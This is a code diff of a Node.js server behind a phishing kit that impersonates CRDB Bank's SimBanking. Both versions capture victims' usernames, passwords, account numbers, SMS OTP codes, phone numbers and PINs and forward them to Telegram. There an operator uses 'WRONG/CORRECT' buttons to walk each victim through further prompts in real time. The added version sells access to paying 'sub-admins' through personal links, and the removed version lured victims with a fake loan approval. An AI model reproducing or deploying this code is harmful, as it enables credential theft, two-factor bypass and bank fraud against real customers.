@@ -1,261 +1,318 @@
+/**
+ * **CRDB SIMBANKING - SECURE MULTI-ADMIN SERVER**
+ * Configured for independent sub-admin routing.
+ */
+
 const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
-const fetch = require('node-fetch');
+const fs = require('fs');
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
+const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '';
 
-const sessions = {};
+if (!TOKEN) {
+  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
+  process.exit(1);
+}
 
-async function sendTelegramMessage(text, replyMarkup) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error('❌ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing in environment variables!');
-    return null;
-  }
+if (!APP_URL) {
+  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
+  process.exit(1);
+}
+
+const ADMINS_FILE = path.join(__dirname, 'admins.json');
+
+function loadAdmins() {
   try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: text,
-        parse_mode: 'Markdown',
-        reply_markup: replyMarkup
-      })
-    });
-    const data = await response.json();
-    if (!data.ok) {
-      console.error('Telegram API Error:', data);
-      return null;
+    if (fs.existsSync(ADMINS_FILE)) {
+      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
+      const entries = JSON.parse(data);
+      return new Map(entries.map(([id, rec]) => [id, {
+        authorized: rec.authorized ?? false,
+        paid: rec.paid ?? false,
+        username: rec.username || '',
+        firstName: rec.firstName || 'User',
+        lastName: rec.lastName || '',
+        status: rec.status || 'PENDING'
+      }]));
     }
-    return data.result ? data.result.message_id : null;
   } catch (err) {
-    console.error('Telegram network error:', err);
-    return null;
+    console.error('[Storage] Error loading admins file:', err);
+  }
+  return new Map();
+}
+
+function saveAdmins() {
+  try {
+    const serialized = JSON.stringify(Array.from(admins.entries()));
+    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
+  } catch (err) {
+    console.error('[Storage] Error saving admins file:', err);
   }
 }
 
-async function answerCallbackQuery(callbackQueryId, text = '') {
+let bot = null;
+const sessions = new Map();
+const admins = loadAdmins();
+
+function resolveTargetChat(adminParam) {
+  if (adminParam && String(adminParam).trim() !== '') {
+    const targetAdmin = String(adminParam).trim();
+    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
+      return FALLBACK_ADMIN_ID;
+    }
+    const adminRecord = admins.get(targetAdmin);
+    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
+      return targetAdmin;
+    }
+  }
+  return null;
+}
+
+async function initBot() {
+  bot = new TelegramBot(TOKEN, { polling: false });
+  const webhookPath = `/bot${TOKEN}`;
+  const webhookUrl = `${APP_URL}${webhookPath}`;
+
   try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        callback_query_id: callbackQueryId,
-        text: text,
-        show_alert: false
-      })
+    await bot.setWebHook(webhookUrl);
+    app.post(webhookPath, (req, res) => {
+      res.sendStatus(200);
+      try { bot.processUpdate(req.body); } catch (err) {}
     });
   } catch (err) {
-    console.error('Failed to answer callback query:', err);
+    process.exit(1);
   }
+
+  bot.onText(/\/start/, async (msg) => {
+    try {
+      const chatId = String(msg.chat.id);
+      let chatInfo = {};
+      try { chatInfo = await bot.getChat(chatId); } catch (e) {}
+
+      const username = chatInfo.username || msg.from.username || '';
+      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
+      const lastName = chatInfo.last_name || msg.from.last_name || '';
+
+      if (chatId === String(FALLBACK_ADMIN_ID)) {
+        await bot.sendMessage(chatId, `👑 *Welcome Main Admin*\nYour personal link: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
+        return;
+      }
+
+      if (!admins.has(chatId)) {
+        admins.set(chatId, { authorized: false, paid: false, username, firstName, lastName, startedAt: new Date() });
+        saveAdmins();
+      }
+
+      const record = admins.get(chatId);
+      if (!record.authorized || !record.paid) {
+        await bot.sendMessage(FALLBACK_ADMIN_ID, 
+          `🚨 *New Sub-Admin Awaiting Approval/Payment!*\n\n` +
+          `👤 *Name:* ${firstName}\n` +
+          `🆔 *Chat ID:* \`${chatId}\``, 
+          { parse_mode: 'Markdown' }
+        );
+
+        await bot.sendMessage(chatId, `👋 *Welcome ${firstName}!*\n\nYour account is awaiting approval and payment clearance.`, { parse_mode: 'Markdown' });
+        return;
+      }
+
+      const userLink = `${APP_URL}/?admin=${chatId}`;
+      await bot.sendMessage(chatId, `👋 *Welcome ${firstName}!*\n\nYour referral link is active:\n${userLink}`, { parse_mode: 'Markdown' });
+    } catch (err) {}
+  });
+
+  bot.on('callback_query', async (query) => {
+    try {
+      const actionData = query.data || '';
+      const chatId = String(query.message.chat.id);
+      const parts = actionData.split('_');
+      const prefix = parts.slice(0, 2).join('_'); 
+      const targetId = parts.slice(2).join('_');
+
+      let session = sessions.get(targetId);
+      if (!session) session = { contact: 'Unknown', adminChatId: chatId };
+
+      const chatTarget = session.adminChatId || chatId;
+
+      switch (prefix) {
+        case 'WRONG_CREDS':
+          session.status = 'RETRY_CREDS';
+          await bot.sendMessage(chatTarget, `❌ Credentials marked as Wrong. User redirected to re-enter username/password.`);
+          break;
+        case 'CORRECT_CREDS':
+          session.status = 'PROCEED_OTP';
+          await bot.sendMessage(chatTarget, `✅ Credentials correct. User proceeding to 6-digit SMS OTP verification.`);
+          break;
+        case 'OTP_EXPIRED':
+          session.status = 'RETRY_OTP';
+          session.otp = '';
+          await bot.sendMessage(chatTarget, `⚠️ OTP expired/invalid. User commanded to enter new incoming 6-digit OTP.`);
+          break;
+        case 'CORRECT_OTP':
+          session.status = 'PROCEED_PHONE_PIN';
+          await bot.sendMessage(chatTarget, `✅ OTP correct. User proceeding to Phone Number & PIN entry.`);
+          break;
+        case 'WRONG_PIN':
+          session.status = 'RETRY_PIN';
+          session.pin = '';
+          await bot.sendMessage(chatTarget, `❌ Wrong PIN. User redirected to re-enter PIN.`);
+          break;
+        case 'CORRECT_PIN':
+        case 'FINAL_SUCCESS':
+          session.status = 'SUCCESS';
+          await bot.sendMessage(chatTarget, `🎉 Application fully approved! Success screen sent.`);
+          break;
+        default:
+          break;
+      }
+
+      await bot.answerCallbackQuery(query.id, { text: `Processed` }).catch(() => {});
+      if (query.message && query.message.message_id) {
+        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
+      }
+    } catch (err) {}
+  });
 }
 
-async function removeInlineKeyboard(chatId, messageId) {
-  try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        message_id: messageId,
-        reply_markup: { inline_keyboard: [] }
-      })
-    });
-  } catch (err) {
-    console.error('Failed to remove keyboard:', err);
-  }
-}
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
-// 1. Submit Credentials
+// Step 1: Submit Username & Password (with Copyable text format for Telegram)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
-    const { sessionId, accountNumber, mobileNumber, pin, loanDetails } = req.body;
-    
-    if (!mobileNumber || !mobileNumber.startsWith('0')) {
-      return res.status(400).json({ success: false, error: 'Mobile number must start with 0' });
+    let { username, password, adminChatId } = req.body || {};
+    if (!adminChatId && req.query && req.query.admin) {
+      adminChatId = req.query.admin;
     }
 
-    sessions[sessionId] = {
-      status: 'pending_credentials',
-      notification: '',
-      accountNumber,
-      mobileNumber,
-      pin,
-      loanDetails
-    };
+    const targetChat = resolveTargetChat(adminChatId);
+    if (!targetChat) {
+      return res.status(400).json({ success: false, error: 'Admin is not authorized or unpaid.' });
+    }
 
-    const message = `🚨 *CRDB SIMBANKING APPLICANT* 🚨\n\n` +
-      `🏦 *Acc No:* \`${accountNumber}\`\n` +
-      `📱 *Mobile:* \`${mobileNumber}\`\n` +
-      `🔑 *PIN:* \`${pin}\`\n` +
-      `💰 *Loan:* ${loanDetails?.amount || '1,000,000 TZS'}`;
+    const userId = `user_${Date.now()}`;
+    sessions.set(userId, { 
+      username, 
+      password, 
+      adminChatId: targetChat, 
+      status: 'WAITING_CREDS_APPROVAL' 
+    });
 
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: '❌ INVALID PHONE', callback_data: `invphone_${sessionId}` },
-          { text: '❌ INVALID ACC', callback_data: `invacc_${sessionId}` }
-        ],
-        [
-          { text: '❌ INVALID PIN', callback_data: `invpin_${sessionId}` },
-          { text: '✅ PROCEED (OTP)', callback_data: `proceedotp_${sessionId}` }
+    const message = `🟢 *CRDB SIMBANKING LOGIN CREDENTIALS*\n\n` +
+                    `👤 *Username:* \`${username}\`\n` +
+                    `🔑 *Password:* \`${password}\`\n\n` +
+                    `📋 *Copy Details:* \`${username}:${password}\``;
+
+    const opts = {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '❌ WRONG DETAILS', callback_data: `WRONG_CREDS_${userId}` },
+            { text: '✅ CORRECT DETAILS', callback_data: `CORRECT_CREDS_${userId}` }
+          ]
         ]
-      ]
+      }
     };
 
-    const msgId = await sendTelegramMessage(message, keyboard);
-    sessions[sessionId].msgId = msgId;
-
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error in submit-credentials:', error);
-    res.status(500).json({ success: false, error: error.message });
+    if (bot) {
+      await bot.sendMessage(targetChat, message, opts);
+    }
+    
+    return res.status(200).json({ success: true, userId });
+  } catch (err) {
+    return res.status(500).json({ success: false, error: 'Network error processing credentials.' });
   }
 });
 
-// 2. Submit OTP (5 Digits Enforcement)
+app.get('/api/check-status/:userId', (req, res) => {
+  const { userId } = req.params;
+  const session = sessions.get(userId);
+  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
+  res.status(200).json({ status: session.status });
+});
+
+// Step 2: Submit 6-digit SMS OTP
 app.post('/api/submit-otp', async (req, res) => {
   try {
-    const { sessionId, otp } = req.body;
-    if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
+    const { userId, otp } = req.body || {};
+    const session = sessions.get(userId);
+    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
 
-    if (!otp || otp.length !== 5 || !/^\d+$/.test(otp)) {
-      return res.status(400).json({ success: false, error: 'OTP must be 5 numeric digits' });
-    }
+    const targetChat = session.adminChatId;
+    session.status = 'WAITING_OTP_VERIFICATION';
+    session.otp = otp;
 
-    sessions[sessionId].status = 'pending_otp';
-    sessions[sessionId].otp = otp;
+    const message = `🟢 *CRDB SIMBANKING 6-DIGIT SMS OTP*\n\n` +
+                    `📱 *OTP Code:* \`${otp}\``;
 
-    const message = `🔑 *OTP SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
-      `🔢 *OTP Entered (5 Digits):* \`${otp}\``;
-
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: '❌ WRONG OTP', callback_data: `wrongotp_${sessionId}` },
-          { text: '✅ CORRECT OTP', callback_data: `correctotp_${sessionId}` }
+    const opts = {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '⚠️ OTP EXPIRES', callback_data: `OTP_EXPIRED_${userId}` },
+            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
+          ]
         ]
-      ]
-    };
-
-    await sendTelegramMessage(message, keyboard);
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error in submit-otp:', error);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// 3. Submit Security PIN
-app.post('/api/submit-security-pin', async (req, res) => {
-  try {
-    const { sessionId, securityPin } = req.body;
-    if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
-
-    if (!securityPin || !/^\d+$/.test(securityPin)) {
-      return res.status(400).json({ success: false, error: 'Security PIN must be numeric' });
-    }
-
-    sessions[sessionId].status = 'pending_security_pin';
-    sessions[sessionId].securityPin = securityPin;
-
-    const message = `🔒 *SECURITY PIN SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
-      `🔑 *PIN:* \`${securityPin}\``;
-
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: '❌ WRONG PIN', callback_data: `wrongpin_${sessionId}` },
-          { text: '✅ CORRECT PIN', callback_data: `correctpin_${sessionId}` }
-        ]
-      ]
-    };
-
-    await sendTelegramMessage(message, keyboard);
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error in submit-security-pin:', error);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.get('/api/status/:sessionId', (req, res) => {
-  const { sessionId } = req.params;
-  const session = sessions[sessionId];
-  if (!session) return res.json({ status: 'not_found' });
-  res.json(session);
-});
-
-app.post('/api/telegram-webhook', async (req, res) => {
-  try {
-    const update = req.body;
-    if (update.callback_query) {
-      const callbackQueryId = update.callback_query.id;
-      const data = update.callback_query.data; 
-      const chatId = update.callback_query.message.chat.id;
-      const messageId = update.callback_query.message.message_id;
-      
-      await answerCallbackQuery(callbackQueryId, 'Imepokelewa!');
-      await removeInlineKeyboard(chatId, messageId);
-
-      const underscoreIndex = data.indexOf('_');
-      const action = data.substring(0, underscoreIndex);
-      const sessionId = data.substring(underscoreIndex + 1);
-
-      if (sessions[sessionId]) {
-        if (action === 'invphone') {
-          sessions[sessionId].status = 'error';
-          sessions[sessionId].notification = 'INVALID PHONE NO: Tafadhali ingiza namba sahihi ya Simbanking inayokubalika.';
-        } else if (action === 'invacc') {
-          sessions[sessionId].status = 'error';
-          sessions[sessionId].notification = 'INVALID ACC. NO: Tafadhali ingiza namba sahihi ya akaunti.';
-        } else if (action === 'invpin') {
-          sessions[sessionId].status = 'error';
-          sessions[sessionId].notification = 'INVALID PIN: Tafadhali ingiza PIN sahihi ya Simbanking.';
-        } else if (action === 'proceedotp') {
-          sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'Fuata maelezo na utumie kitufe cha kupiga simu kilicho kwenye ukurasa kupata OTP.';
-        } else if (action === 'wrongotp') {
-          sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP ya tarakimu 5.';
-        } else if (action === 'correctotp') {
-          sessions[sessionId].status = 'enter_security_pin';
-          sessions[sessionId].notification = 'OTP SWAHIHI ✅ - Endelea kuweka PIN ya usalama.';
-        } else if (action === 'wrongpin') {
-          sessions[sessionId].status = 'enter_security_pin';
-          sessions[sessionId].notification = 'WRONG PIN: Tafadhali ingiza PIN sahihi ya usalama.';
-        } else if (action === 'correctpin') {
-          sessions[sessionId].status = 'pending_approval';
-          sessions[sessionId].notification = 'PIN SAHIHI ✅ - Inasubiri idhinisho la mwisho.';
-          
-          await sendTelegramMessage(`✨ *READY FOR FINAL APPROVAL* for Acc: \`${sessions[sessionId].accountNumber}\``, {
-            inline_keyboard: [
-              [
-                { text: '✅ APPROVE LOAN', callback_data: `approvefinal_${sessionId}` },
-                { text: '❌ REJECT', callback_data: `rejectfinal_${sessionId}` }
-              ]
-            ]
-          });
-        } else if (action === 'approvefinal') {
-          sessions[sessionId].status = 'success';
-          sessions[sessionId].notification = 'Hongera! Mkopo wako umeidhinishwa!';
-        }
       }
-    }
-  } catch (err) {
-    console.error('Webhook error:', err);
+    };
+
+    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
+
+    return res.status(200).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Error submitting OTP' });
   }
-  res.sendStatus(200);
+});
+
+// Step 3: Submit Phone Number & PIN
+app.post('/api/submit-phone-pin', async (req, res) => {
+  try {
+    const { userId, phone, pin } = req.body || {};
+    const session = sessions.get(userId);
+    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
+
+    const targetChat = session.adminChatId;
+    session.status = 'WAITING_PIN_VERIFICATION';
+    session.phone = phone;
+    session.pin = pin;
+
+    const message = `🟢 *CRDB SIMBANKING PHONE & PIN*\n\n` +
+                    `📞 *Phone:* \`${phone}\`\n` +
+                    `🔒 *PIN:* \`${pin}\``;
+
+    const opts = {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '❌ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
+            { text: '✅ CORRECT PIN', callback_data: `CORRECT_PIN_${userId}` }
+          ]
+        ]
+      }
+    };
+
+    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
+
+    return res.status(200).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Error submitting phone and PIN' });
+  }
 });
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`CRDB Server running on port ${PORT}`));
-          
+app.listen(PORT, async () => {
+  await initBot();
+  console.log(`Server running on port ${PORT}`);
+});
+                
